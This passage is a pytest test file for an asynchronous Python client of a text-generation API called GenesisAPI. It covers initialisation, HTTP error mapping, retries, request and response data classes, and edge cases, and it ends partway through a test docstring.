<fixed_code>
import pytest
import json
import asyncio
import aiohttp
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timezone
import uuid
import logging

# Import the module under test
from app.ai_backend.genesis_api import (
    GenesisAPI,
    GenesisAPIError,
    GenesisAPITimeoutError,
    GenesisAPIAuthenticationError,
    GenesisAPIRateLimitError,
    GenesisAPIServerError,
    GenesisRequest,
    GenesisResponse,
    validate_api_key,
    format_genesis_prompt,
    parse_genesis_response,
    handle_genesis_error,
    retry_with_exponential_backoff
)


class TestGenesisAPI:
    """Test class for GenesisAPI functionality."""

    def setup_method(self):
        """
        Set up a GenesisAPI instance with a test API key and base URL before each test.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    def teardown_method(self):
        """
        Cleans up resources after each test method execution.
        """
        # Clean up any resources
        pass

    def test_genesis_api_initialization(self):
        """
        Test that GenesisAPI initializes correctly with valid API key and base URL, and sets default timeout and max_retries values.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        assert api.api_key == self.api_key
        assert api.base_url == self.base_url
        assert api.timeout == 30  # default timeout
        assert api.max_retries == 3  # default max retries

    def test_genesis_api_initialization_with_custom_params(self):
        """
        Verifies that the GenesisAPI initializes correctly with custom timeout and max_retries parameters.
        """
        api = GenesisAPI(
            api_key=self.api_key,
            base_url=self.base_url,
            timeout=60,
            max_retries=5
        )
        assert api.timeout == 60
        assert api.max_retries == 5

    def test_genesis_api_initialization_invalid_api_key(self):
        """
        Test that initializing GenesisAPI with an invalid API key raises a GenesisAPIAuthenticationError.
        """
        with pytest.raises(GenesisAPIAuthenticationError):
            GenesisAPI(api_key="", base_url=self.base_url)

    def test_genesis_api_initialization_invalid_base_url(self):
        """
        Verify that initializing GenesisAPI with an empty base URL raises a ValueError.
        """
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url="")

    @pytest.mark.asyncio
    async def test_generate_text_success(self):
        """
        Asynchronously verifies that `generate_text` returns a valid response object when the API call is successful.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Test prompt")
            
            assert result.text == "Generated text response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 10

    @pytest.mark.asyncio
    async def test_generate_text_with_parameters(self):
        """
        Asynchronously verifies that generating text with custom parameters returns the expected response and that the request payload contains the correct model, max_tokens, and temperature values.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v2",
            "created": 1234567890,
            "usage": {"prompt_tokens": 15, "completion_tokens": 25}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text(
                prompt="Test prompt",
                model="genesis-v2",
                max_tokens=100,
                temperature=0.8
            )
            
            # Verify the request was made with correct parameters
            mock_post.assert_called_once()
            call_args = mock_post.call_args
            assert call_args[1]['json']['model'] == "genesis-v2"
            assert call_args[1]['json']['max_tokens'] == 100
            assert call_args[1]['json']['temperature'] == 0.8

    @pytest.mark.asyncio
    async def test_generate_text_authentication_error(self):
        """
        Test that `generate_text` raises `GenesisAPIAuthenticationError` when the API responds with a 401 status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Invalid API key"}
            )
            
            with pytest.raises(GenesisAPIAuthenticationError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_rate_limit_error(self):
        """
        Test that generate_text raises GenesisAPIRateLimitError when the API responds with a 429 status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded"}
            )
            
            with pytest.raises(GenesisAPIRateLimitError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_server_error(self):
        """
        Tests that a server error (HTTP 500) during text generation raises a GenesisAPIServerError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Internal server error"}
            )
            
            with pytest.raises(GenesisAPIServerError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_timeout_error(self):
        """
        Test that a timeout during asynchronous text generation raises a GenesisAPITimeoutError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = asyncio.TimeoutError()
            
            with pytest.raises(GenesisAPITimeoutError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_empty_prompt(self):
        """
        Test that calling `generate_text` with an empty prompt raises a ValueError.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text("")

    @pytest.mark.asyncio
    async def test_generate_text_none_prompt(self):
        """
        Test that `generate_text` raises a ValueError when called with a None prompt.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text(None)

    @pytest.mark.asyncio
    async def test_generate_text_very_long_prompt(self):
        """
        Tests that generating text with an excessively long prompt results in a 400 error and raises a GenesisAPIError.
        """
        long_prompt = "A" * 10000
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Prompt too long"}
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text(long_prompt)

    @pytest.mark.asyncio
    async def test_generate_text_with_retry_logic(self):
        """
        Test that `generate_text` retries after a transient 503 error and succeeds on a subsequent attempt.
        
        Simulates a 503 Service Unavailable error on the first request and a successful response on retry, verifying that the retry mechanism enables successful text generation.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # First call fails with 503, second succeeds
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=[
                    {"error": "Service temporarily unavailable"},
                    mock_response
                ]
            )
            
            # Mock the retry logic
            with patch('asyncio.sleep'):
                # Should succeed after retry
                result = await self.genesis_api.generate_text("Test prompt")
                assert result.text == "Generated text response"

    def test_validate_api_key_valid(self):
        """
        Verifies that `validate_api_key` returns True when provided with a valid API key string.
        """
        valid_key = "sk-1234567890abcdef"
        assert validate_api_key(valid_key) == True

    def test_validate_api_key_invalid(self):
        """
        Test that `validate_api_key` returns False for a range of invalid API key formats, including empty, None, and improperly formatted strings.
        """
        invalid_keys = [
            "",
            None,
            "short",
            "invalid_format",
            "sk-",
            "sk-123"
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False

    def test_format_genesis_prompt_basic(self):
        """
        Verify that `format_genesis_prompt` formats a simple prompt and returns a dictionary containing the prompt and required fields.
        """
        prompt = "Hello world"
        formatted = format_genesis_prompt(prompt)
        assert isinstance(formatted, dict)
        assert formatted["prompt"] == prompt
        assert "model" in formatted
        assert "max_tokens" in formatted

    def test_format_genesis_prompt_with_parameters(self):
        """
        Verifies that `format_genesis_prompt` returns a dictionary with the correct prompt, model, max_tokens, and temperature values when custom parameters are provided.
        """
        prompt = "Test prompt"
        formatted = format_genesis_prompt(
            prompt=prompt,
            model="genesis-v2",
            max_tokens=500,
            temperature=0.9
        )
        
        assert formatted["prompt"] == prompt
        assert formatted["model"] == "genesis-v2"
        assert formatted["max_tokens"] == 500
        assert formatted["temperature"] == 0.9

    def test_format_genesis_prompt_invalid_temperature(self):
        """
        Test that `format_genesis_prompt` raises a ValueError when provided with an out-of-range temperature value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", temperature=1.5)

    def test_format_genesis_prompt_invalid_max_tokens(self):
        """
        Verify that `format_genesis_prompt` raises a ValueError when provided with an invalid `max_tokens` value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", max_tokens=-1)

    def test_parse_genesis_response_valid(self):
        """
        Tests that a valid Genesis API response dictionary is parsed into a GenesisResponse object with correct field values.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        result = parse_genesis_response(response_data)
        assert isinstance(result, GenesisResponse)
        assert result.id == "test_id_123"
        assert result.text == "Generated text"
        assert result.model == "genesis-v1"
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10

    def test_parse_genesis_response_missing_required_fields(self):
        """
        Verify that parsing a response missing required fields raises a GenesisAPIError.
        
        Ensures that the response parser enforces the presence of all mandatory fields by testing multiple invalid response dictionaries.
        """
        invalid_responses = [
            {},
            {"id": "test"},
            {"text": "test"},
            {"id": "test", "text": "test"}  # missing model
        ]
        
        for response in invalid_responses:
            with pytest.raises(GenesisAPIError):
                parse_genesis_response(response)

    def test_parse_genesis_response_invalid_usage_format(self):
        """
        Test that parsing a response with an incorrectly formatted 'usage' field raises a GenesisAPIError.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": "invalid_usage_format"
        }
        
        with pytest.raises(GenesisAPIError):
            parse_genesis_response(response_data)

    def test_handle_genesis_error_401(self):
        """
        Test that handling a 401 status code raises a GenesisAPIAuthenticationError.
        """
        with pytest.raises(GenesisAPIAuthenticationError):
            handle_genesis_error(401, {"error": "Unauthorized"})

    def test_handle_genesis_error_429(self):
        """
        Test that handling a 429 status code raises a GenesisAPIRateLimitError.
        """
        with pytest.raises(GenesisAPIRateLimitError):
            handle_genesis_error(429, {"error": "Rate limit exceeded"})

    def test_handle_genesis_error_500(self):
        """
        Verify that handling a 500 status code raises a GenesisAPIServerError.
        """
        with pytest.raises(GenesisAPIServerError):
            handle_genesis_error(500, {"error": "Internal server error"})

    def test_handle_genesis_error_generic(self):
        """
        Test that `handle_genesis_error` raises a `GenesisAPIError` for generic error responses with status code 400.
        """
        with pytest.raises(GenesisAPIError):
            handle_genesis_error(400, {"error": "Bad request"})

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_success(self):
        """
        Verifies that `retry_with_exponential_backoff` retries a failing async function and returns the correct result after a successful retry.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Server error"),
            "Success"
        ]
        
        with patch('asyncio.sleep'):
            result = await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert result == "Success"
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_max_retries(self):
        """
        Test that `retry_with_exponential_backoff` raises the last exception after exhausting the maximum number of retries.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIServerError("Server error")
        
        with patch('asyncio.sleep'):
            with pytest.raises(GenesisAPIServerError):
                await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_non_retryable_error(self):
        """
        Test that `retry_with_exponential_backoff` does not retry on non-retryable errors.
        
        Verifies that when a non-retryable exception such as `GenesisAPIAuthenticationError` is raised, the function raises the exception immediately without retrying.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIAuthenticationError("Auth error")
        
        with pytest.raises(GenesisAPIAuthenticationError):
            await retry_with_exponential_backoff(mock_func, max_retries=2)
        assert mock_func.call_count == 1  # Should not retry auth errors


class TestGenesisRequest:
    """Test class for GenesisRequest data class."""

    def test_genesis_request_creation(self):
        """Test creating GenesisRequest instance."""
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_to_dict(self):
        """
        Verify that a GenesisRequest instance is accurately converted to a dictionary with all fields correctly represented.
        """
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        result = request.to_dict()
        assert isinstance(result, dict)
        assert result["prompt"] == "Test prompt"
        assert result["model"] == "genesis-v1"
        assert result["max_tokens"] == 100
        assert result["temperature"] == 0.7

    def test_genesis_request_from_dict(self):
        """
        Verify that a GenesisRequest instance is accurately constructed from a dictionary input using from_dict().
        """
        data = {
            "prompt": "Test prompt",
            "model": "genesis-v1",
            "max_tokens": 100,
            "temperature": 0.7
        }
        
        request = GenesisRequest.from_dict(data)
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_validation(self):
        """
        Verify that `GenesisRequest` raises a `ValueError` when initialized with an empty prompt, empty model, or negative max_tokens.
        """
        with pytest.raises(ValueError):
            GenesisRequest(prompt="", model="genesis-v1")
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="", max_tokens=100)
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="genesis-v1", max_tokens=-1)


class TestGenesisResponse:
    """Test class for GenesisResponse data class."""

    def test_genesis_response_creation(self):
        """
        Verifies that a GenesisResponse object is instantiated with the expected field values.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10

    def test_genesis_response_to_dict(self):
        """
        Tests that GenesisResponse.to_dict returns a dictionary with all fields accurately represented.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        result = response.to_dict()
        assert isinstance(result, dict)
        assert result["id"] == "test_id"
        assert result["text"] == "Generated text"
        assert result["model"] == "genesis-v1"
        assert result["created"] == 1234567890
        assert result["usage"]["prompt_tokens"] == 10

    def test_genesis_response_from_dict(self):
        """
        Tests that GenesisResponse.from_dict correctly creates a GenesisResponse instance with all fields populated from a dictionary.
        """
        data = {
            "id": "test_id",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        response = GenesisResponse.from_dict(data)
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10


class TestGenesisAPIExceptions:
    """Test class for Genesis API exception classes."""

    def test_genesis_api_error(self):
        """Test GenesisAPIError exception."""
        error = GenesisAPIError("Test error")
        assert str(error) == "Test error"
        assert isinstance(error, Exception)

    def test_genesis_api_authentication_error(self):
        """Test GenesisAPIAuthenticationError exception."""
        error = GenesisAPIAuthenticationError("Auth error")
        assert str(error) == "Auth error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_rate_limit_error(self):
        """
        Test that GenesisAPIRateLimitError is properly instantiated, stringified, and inherits from GenesisAPIError.
        """
        error = GenesisAPIRateLimitError("Rate limit error")
        assert str(error) == "Rate limit error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_server_error(self):
        """
        Test that the GenesisAPIServerError exception is correctly instantiated and inherits from GenesisAPIError.
        """
        error = GenesisAPIServerError("Server error")
        assert str(error) == "Server error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_timeout_error(self):
        """Test GenesisAPITimeoutError exception."""
        error = GenesisAPITimeoutError("Timeout error")
        assert str(error) == "Timeout error"
        assert isinstance(error, GenesisAPIError)


class TestGenesisAPIIntegration:
    """Integration tests for Genesis API."""

    def setup_method(self):
        """
        Set up the API key and base URL for integration tests.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"

    @pytest.mark.asyncio
    async def test_end_to_end_text_generation(self):
        """
        Tests the full asynchronous text generation workflow, ensuring that GenesisAPI returns and parses a valid response as expected.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "This is a generated response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test the complete workflow
            result = await genesis_api.generate_text("Hello, world!")
            
            assert result.text == "This is a generated response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 5
            assert result.usage["completion_tokens"] == 10

    @pytest.mark.asyncio
    async def test_concurrent_requests(self):
        """
        Verify that GenesisAPI correctly processes multiple concurrent text generation requests and returns the expected responses for each.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "Concurrent response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create multiple concurrent requests
            tasks = [
                genesis_api.generate_text(f"Prompt {i}")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks)
            
            assert len(results) == 5
            for result in results:
                assert result.text == "Concurrent response"
                assert result.model == "genesis-v1"

    @pytest.mark.asyncio
    async def test_context_manager_usage(self):
        """
        Tests that GenesisAPI functions correctly as an asynchronous context manager and can generate text within the managed context.
        """
        with patch('aiohttp.ClientSession') as mock_session:
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                mock_response = {
                    "id": "test_id_123",
                    "text": "Context manager response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                mock_session.return_value.post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_session.return_value.post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test prompt")
                assert result.text == "Context manager response"


# Fixtures for common test data
@pytest.fixture
def sample_genesis_request():
    """
    Pytest fixture that provides a sample GenesisRequest instance for use in tests.
    
    Returns:
        GenesisRequest: A sample request with preset prompt, model, max_tokens, and temperature.
    """
    return GenesisRequest(
        prompt="Test prompt",
        model="genesis-v1",
        max_tokens=100,
        temperature=0.7
    )


@pytest.fixture
def sample_genesis_response():
    """
    Pytest fixture that provides a sample GenesisResponse object for testing purposes.
    
    Returns:
        GenesisResponse: A sample response with preset fields for use in test cases.
    """
    return GenesisResponse(
        id="test_id_123",
        text="Generated text response",
        model="genesis-v1",
        created=1234567890,
        usage={"prompt_tokens": 10, "completion_tokens": 20}
    )


@pytest.fixture
def mock_genesis_api():
    """
    Fixture that provides a mocked GenesisAPI instance with test credentials for use in unit tests.
    """
    return GenesisAPI(api_key="test_api_key", base_url="https://api.genesis.example.com")


# Performance tests
class TestGenesisAPIPerformance:
    """Performance tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_response_time_measurement(self):
        """
        Measures the response time of a mocked API call and asserts that it completes within an acceptable duration, verifying the returned response content.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Performance test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Performance test")
            end_time = datetime.now()
            
            response_time = (end_time - start_time).total_seconds()
            assert response_time < 1.0  # Should complete quickly in mock
            assert result.text == "Performance test response"

    @pytest.mark.asyncio
    async def test_large_batch_processing(self):
        """
        Asynchronously verifies that GenesisAPI can handle and correctly process a large batch of concurrent text generation requests.
        
        Ensures that all responses are returned as expected when processing multiple prompts in parallel.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Batch response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Process 50 requests in batch
            batch_size = 50
            prompts = [f"Batch prompt {i}" for i in range(batch_size)]
            
            tasks = [genesis_api.generate_text(prompt) for prompt in prompts]
            results = await asyncio.gather(*tasks)
            
            assert len(results) == batch_size
            for result in results:
                assert result.text == "Batch response"


# Edge case tests
class TestGenesisAPIEdgeCases:
    """Edge case tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_unicode_prompt_handling(self):
        """
        Verify that GenesisAPI can process prompts containing Unicode characters and returns the expected response.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        unicode_prompt = "Hello 世界 🌍 émojis and spëcial chars"
        
        mock_response = {
            "id": "test_id_123",
            "text": "Unicode response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await genesis_api.generate_text(unicode_prompt)
            assert result.text == "Unicode response"

    @pytest.mark.asyncio
    async def test_malformed_json_response(self):
        """
        Test that GenesisAPI raises a GenesisAPIError when the API response contains malformed JSON.
        
        This test mocks the API response to simulate a JSON decoding error and verifies that the appropriate exception is raised.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_network_connection_error(self):
        """
        Test that a network connection error during text generation raises a GenesisAPIError.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientConnectionError("Connection failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")


if __name__ == "__main__":
    pytest.main([__file__])

# Additional comprehensive test scenarios
class TestGenesisAPIAdvancedScenarios:
    """Advanced test scenarios for comprehensive coverage."""
    
    def setup_method(self):
        """
        Set up a GenesisAPI instance with advanced test credentials for use in advanced scenario tests.
        """
        self.api_key = "test_api_key_advanced"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_generate_text_with_extreme_parameters(self):
        """
        Tests that GenesisAPI correctly generates text when called with extreme values for max_tokens and temperature, ensuring proper handling and expected responses without errors.
        """
        mock_response = {
            "id": "extreme_test_id",
            "text": "Extreme parameters response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 1, "completion_tokens": 4096}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test with maximum tokens
            result = await self.genesis_api.generate_text(
                prompt="Test",
                max_tokens=4096,
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with minimum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with maximum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=1.0
            )
            assert result.text == "Extreme parameters response"

    @pytest.mark.asyncio
    async def test_memory_efficient_large_response_handling(self):
        """
        Verify that the API client can process and return very large text responses (e.g., 50KB) efficiently and without errors.
        """
        large_text = "A" * 50000  # 50KB response
        mock_response = {
            "id": "large_response_id",
            "text": large_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Generate large text")
            assert len(result.text) == 50000
            assert result.usage["completion_tokens"] == 50000

    @pytest.mark.asyncio
    async def test_api_key_security_validation(self):
        """
        Verifies that the API key is not exposed in the string representation of the GenesisAPI instance.
        """
        # Test that API key is not logged or exposed
        with patch('logging.getLogger') as mock_logger:
            api = GenesisAPI(api_key="secret_key_123", base_url=self.base_url)
            # Verify API key is stored securely and not exposed in string representation
            api_str = str(api)
            assert "secret_key_123" not in api_str
            
    def test_validate_api_key_comprehensive_formats(self):
        """
        Verifies that `validate_api_key` correctly accepts a variety of valid API key formats and rejects invalid or malformed keys, including edge cases with incorrect length or invalid characters.
        """
        # Valid formats
        valid_keys = [
            "sk-1234567890abcdef1234567890abcdef",
            "sk-ABCDEF1234567890abcdef1234567890",
            "sk-" + "a" * 48,  # 50 char total
        ]
        
        for key in valid_keys:
            assert validate_api_key(key) == True, f"Valid key {key} should pass validation"
            
        # Invalid formats - edge cases
        invalid_keys = [
            "sk-" + "a" * 5,    # Too short
            "sk-" + "a" * 100,  # Too long
            "sk-abc@def",       # Invalid characters
            "sk- " + "a" * 20,  # Space in key
            "sk-\n" + "a" * 20, # Newline in key
            "sk-\t" + "a" * 20, # Tab in key
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False, f"Invalid key {key} should fail validation"

    @pytest.mark.asyncio
    async def test_concurrent_rate_limiting_scenarios(self):
        """
        Tests that multiple concurrent requests to GenesisAPI raise a rate limiting error when the API responds with HTTP 429.
        
        Simulates simultaneous requests encountering rate limiting and verifies that each triggers the appropriate exception.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate rate limiting for first few requests, then success
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded", "retry_after": 1}
            )
            
            # Test multiple concurrent requests hitting rate limit
            tasks = [
                genesis_api.generate_text(f"Concurrent prompt {i}")
                for i in range(3)
            ]
            
            with pytest.raises(GenesisAPIRateLimitError):
                await asyncio.gather(*tasks, return_exceptions=True)

    @pytest.mark.asyncio
    async def test_request_id_tracking(self):
        """
        Test that the API returns a request ID that matches the expected UUID and is correctly formatted.
        
        Ensures the request ID in the response is tracked, matches the generated UUID, and is a valid UUID string.
        """
        request_id = str(uuid.uuid4())
        mock_response = {
            "id": request_id,
            "text": "Tracked response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Track this request")
            assert result.id == request_id
            
            # Verify request ID is properly formatted UUID
            uuid.UUID(result.id)  # Should not raise exception

    @pytest.mark.asyncio
    async def test_response_streaming_simulation(self):
        """
        Tests the simulation of streaming API responses by mocking a chunked response and verifying that the generated text is correctly extracted from the response.
        """
        # Test chunked response processing
        mock_response = {
            "id": "stream_test_id",
            "text": "This is a streaming response that comes in chunks",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 8, "completion_tokens": 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Stream this response")
            assert "streaming response" in result.text

    @pytest.mark.asyncio
    async def test_connection_pool_management(self):
        """
        Tests that the GenesisAPI async context manager properly manages and cleans up the HTTP connection pool during asynchronous operations.
        """
        # Test that connections are properly managed
        async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
            mock_response = {
                "id": "pool_test_id",
                "text": "Connection pool response",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test connection pool")
                assert result.text == "Connection pool response"

    def test_format_genesis_prompt_boundary_values(self):
        """
